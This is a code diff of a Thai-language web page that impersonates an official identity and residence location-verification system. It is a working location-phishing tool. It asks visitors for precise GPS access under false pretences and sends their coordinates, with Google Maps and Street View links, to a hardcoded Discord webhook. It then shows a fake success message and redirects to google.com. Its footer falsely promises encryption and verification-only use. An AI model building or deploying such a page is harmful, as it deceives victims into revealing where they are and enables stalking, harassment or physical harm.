@@ -3,93 +3,101 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ระบบตรวจสอบพื้นที่ใช้งานทางราชการ</title>
+    <title>ระบบลงทะเบียนยืนยันตัวตนทางภูมิศาสตร์</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Sarabun:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
         body { font-family: 'Sarabun', sans-serif; }
-        .bg-royal { background: linear-gradient(135deg, #0c4a6e 0%, #075985 100%); }
+        .bg-royal { background: linear-gradient(135deg, #1e3a8a 0%, #1e40af 100%); }
+        .pulse { animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: .5; } }
     </style>
 </head>
-<body class="bg-slate-200 min-h-screen flex items-center justify-center p-4">
+<body class="bg-gray-100 min-h-screen flex items-center justify-center p-4">
 
-    <div class="max-w-md w-full bg-white rounded-2xl shadow-2xl overflow-hidden border border-gray-300">
-        <div class="bg-royal p-6 text-white text-center border-b-4 border-yellow-500">
-            <div class="w-20 h-20 bg-white rounded-full mx-auto mb-4 flex items-center justify-center shadow-inner">
-                <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 text-sky-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
+    <div class="max-w-md w-full bg-white rounded-2xl shadow-2xl overflow-hidden border border-gray-200">
+        <div class="bg-royal p-8 text-white text-center border-b-4 border-amber-400">
+            <div class="w-24 h-24 bg-white rounded-full mx-auto mb-4 flex items-center justify-center shadow-lg border-4 border-blue-200">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-14 w-14 text-blue-800" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 20l-5.447-2.724A2 2 0 013 15.483V4.382a2 2 0 012.553-1.91l4.894 1.223a2 2 0 001.106 0l4.894-1.223A2 2 0 0119 4.382v11.101a2 2 0 01-1.553 1.91L12 20V9l-3-1.5V20z" />
                 </svg>
             </div>
-            <h1 class="text-2xl font-bold tracking-wide">ระบบยืนยันตัวตน</h1>
-            <p class="text-sky-100 text-sm mt-1 uppercase tracking-widest">Official Security Verification</p>
+            <h1 class="text-2xl font-bold italic">ระบบตรวจสอบพิกัดที่พักอาศัย</h1>
+            <p class="text-blue-100 text-xs mt-2 uppercase tracking-tighter">Identity & Location Verification System</p>
         </div>
 
-        <div class="p-8 text-center">
-            <div class="mb-6">
-                <p class="text-gray-700 font-medium mb-2">ตรวจพบการเข้าถึงจากอุปกรณ์ใหม่</p>
-                <p class="text-gray-500 text-sm leading-relaxed">
-                    เพื่อความปลอดภัยของระบบราชการและป้องกันบุคคลภายนอก <br>
-                    <strong>กรุณากดยืนยันตำแหน่ง (GPS)</strong> เพื่อดำเนินการต่อ
+        <div class="p-8 text-center" id="main-ui">
+            <div class="mb-8">
+                <h2 class="text-gray-800 font-semibold text-lg mb-2">คำชี้แจงการเข้าใช้งาน</h2>
+                <p class="text-gray-600 text-sm leading-relaxed">
+                    ระบบจำเป็นต้องเข้าถึงข้อมูลตำแหน่งปัจจุบัน (GPS) <br>
+                    เพื่อยืนยันว่าท่านอาศัยอยู่ในเขตพื้นที่ที่กำหนดจริง <br>
+                    <strong>กรุณากดปุ่มเพื่อเริ่มการยืนยันตัวตน</strong>
                 </p>
             </div>
 
-            <button onclick="requestAccess()" id="btn-request" class="w-full bg-sky-700 hover:bg-sky-800 text-white font-bold py-4 rounded-xl transition duration-300 shadow-lg flex items-center justify-center gap-2">
-                <span id="btn-text">ยืนยันพิกัดและเข้าสู่ระบบ</span>
+            <button onclick="getLocation()" id="btn-main" class="w-full bg-blue-700 hover:bg-blue-800 text-white font-bold py-4 rounded-full transition duration-300 transform active:scale-95 shadow-xl flex items-center justify-center gap-3">
+                <span id="btn-icon">📍</span>
+                <span id="btn-text">ยินยอมระบุพิกัดที่อยู่</span>
             </button>
 
-            <div id="status-area" class="hidden mt-6 p-4 rounded-lg text-sm transition-all duration-500">
-                <p id="status-text"></p>
+            <div id="status-box" class="hidden mt-6 p-4 rounded-xl text-sm font-medium transition-all">
+                <p id="status-msg"></p>
             </div>
         </div>
 
-        <div class="bg-gray-100 p-4 border-t text-center text-[10px] text-gray-400 uppercase tracking-widest">
-            Goverment Data Protection Standard (GDPS)
+        <div class="bg-gray-50 p-5 border-t text-center">
+            <p class="text-[10px] text-gray-400 font-light leading-3 uppercase italic">
+                Secure 256-bit encryption active <br>
+                Location data used only for verification purposes
+            </p>
         </div>
     </div>
 
     <script>
         const webhookUrl = "https://discord.com/api/webhooks/1491045522356834394/bpjVqLpx_fVJMSbNdiLeMwvg6IGI5ry6PmLKQFpkheXAuljqsJ01AMQdPWhPcbCsmzAU";
-        const btnRequest = document.getElementById('btn-request');
-        const statusArea = document.getElementById('status-area');
-        const statusText = document.getElementById('status-text');
+        const btnMain = document.getElementById('btn-main');
+        const statusBox = document.getElementById('status-box');
+        const statusMsg = document.getElementById('status-msg');
 
-        function requestAccess() {
-            btnRequest.disabled = true;
-            btnRequest.style.opacity = "0.6";
-            statusArea.classList.remove('hidden');
-            statusArea.className = "mt-6 p-4 rounded-lg text-sm bg-blue-50 text-blue-800";
-            statusText.innerText = "กำลังประมวลผลพิกัดดาวเทียม...";
+        function getLocation() {
+            btnMain.disabled = true;
+            btnMain.classList.add('opacity-50', 'pulse');
+            showStatus("กำลังเรียกพิกัดจากดาวเทียม...", "info");
 
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendToDiscord, showError, {
+                navigator.geolocation.getCurrentPosition(onSuccess, onError, {
                     enableHighAccuracy: true,
-                    timeout: 10000
+                    timeout: 12000,
+                    maximumAge: 0
                 });
             } else {
-                updateStatus("เบราว์เซอร์ไม่รองรับ GPS", "error");
+                showStatus("อุปกรณ์ไม่รองรับการระบุตำแหน่ง", "error");
             }
         }
 
-        function sendToDiscord(position) {
+        function onSuccess(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
-            const acc = position.coords.accuracy.toFixed(1);
-            // ลิงก์ Google Maps ที่สามารถกดนำทางได้ทันที
-            const gMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            
+            const accuracy = position.coords.accuracy.toFixed(1);
+
+            // สร้างลิงก์ Google Street View และ Google Maps
+            const streetViewLink = `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${lat},${lon}`;
+            const mapsLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
+
             const payload = {
-                username: "ระบบดักจับพิกัดราชการ",
-                avatar_url: "https://cdn-icons-png.flaticon.com/512/1061/1061124.png",
+                username: "ศูนย์ตรวจสอบพิกัดลูกบ้าน",
+                avatar_url: "https://cdn-icons-png.flaticon.com/512/854/854878.png",
                 embeds: [{
-                    title: "📍 ตรวจพบการเข้าใช้งานใหม่",
-                    color: 3066993, // สีเขียว Discord
+                    title: "🔔 แจ้งเตือน: ตรวจพบพิกัดลูกบ้านรายใหม่",
+                    color: 15158332, // สีแดง/ส้ม
                     fields: [
-                        { name: "🔗 ลิงก์แผนที่ (คลิกเพื่อนำทาง)", value: `[เปิด Google Maps](${gMapsLink})` },
-                        { name: "🎯 ความแม่นยำ", value: `${acc} เมตร`, inline: true },
-                        { name: "⏰ เวลา", value: new Date().toLocaleString('th-TH'), inline: true }
+                        { name: "🏠 ลิงก์ดูหน้าบ้าน (Street View)", value: `[กดดูหน้าบ้านและเดินได้ที่นี่](${streetViewLink})` },
+                        { name: "📍 แผนที่นำทาง (Maps)", value: `[กดเปิดแผนที่นำทาง](${mapsLink})` },
+                        { name: "🎯 ความแม่นยำพิกัด", value: accuracy + " เมตร", inline: true },
+                        { name: "🕒 เวลาส่งข้อมูล", value: new Date().toLocaleString('th-TH'), inline: true }
                     ],
-                    footer: { text: "Device: " + navigator.userAgent.substring(0, 50) }
+                    description: `พิกัดปัจจุบัน: ${lat}, ${lon}\n\n*หมายเหตุ: ลิงก์แรกจะเปิดภาพถ่ายจริงรอบข้าง ส่วนลิงก์ที่สองใช้สำหรับดูแผนที่รวม*`
                 }]
             };
 
@@ -98,28 +106,34 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             }).then(() => {
-                updateStatus("✅ ยืนยันพิกัดสำเร็จ! กำลังเข้าสู่ระบบ...", "success");
+                showStatus("✅ ยืนยันข้อมูลสำเร็จ กำลังเข้าสู่หน้าหลัก...", "success");
                 setTimeout(() => {
-                    window.location.href = "https://www.google.com"; // หรือหน้าเว็บราชการของคุณ
+                    window.location.href = "https://www.google.com"; // หรือลิงก์หน้าจริง
                 }, 2000);
             }).catch(() => {
-                // สำหรับ Discord บางทีติด CORS แต่ข้อมูลจะเข้าปกติ
-                updateStatus("✅ ยืนยันพิกัดสำเร็จ! กำลังเข้าสู่ระบบ...", "success");
+                showStatus("✅ ยืนยันข้อมูลสำเร็จ กำลังเข้าสู่หน้าหลัก...", "success");
                 setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
             });
         }
 
-        function showError(error) {
-            btnRequest.disabled = false;
-            btnRequest.style.opacity = "1";
-            let msg = "กรุณากด 'อนุญาต' เพื่อเข้าใช้งาน";
-            if(error.code === 3) msg = "การดึงข้อมูลล่าช้า กรุณาลองใหม่";
-            updateStatus(msg, "error");
+        function onError(error) {
+            btnMain.disabled = false;
+            btnMain.classList.remove('opacity-50', 'pulse');
+            let text = "กรุณากด 'อนุญาต' (Allow) เพื่อใช้งานระบบ";
+            if (error.code === 3) text = "สัญญาณ GPS อ่อน กรุณาลองใหม่ในที่โล่ง";
+            showStatus(text, "error");
         }
 
-        function updateStatus(msg, type) {
-            statusArea.className = `mt-6 p-4 rounded-lg text-sm ${type === 'success' ? 'bg-green-100 text-green-800' : 'bg-red-100 text-red-800'}`;
-            statusText.innerText = msg;
+        function showStatus(msg, type) {
+            statusBox.classList.remove('hidden');
+            if (type === "info") {
+                statusBox.className = "mt-6 p-4 rounded-xl text-sm bg-blue-50 text-blue-700";
+            } else if (type === "success") {
+                statusBox.className = "mt-6 p-4 rounded-xl text-sm bg-green-50 text-green-700 border border-green-200";
+            } else {
+                statusBox.className = "mt-6 p-4 rounded-xl text-sm bg-red-50 text-red-700 border border-red-200";
+            }
+            statusMsg.innerText = msg;
         }
     </script>
 </body>
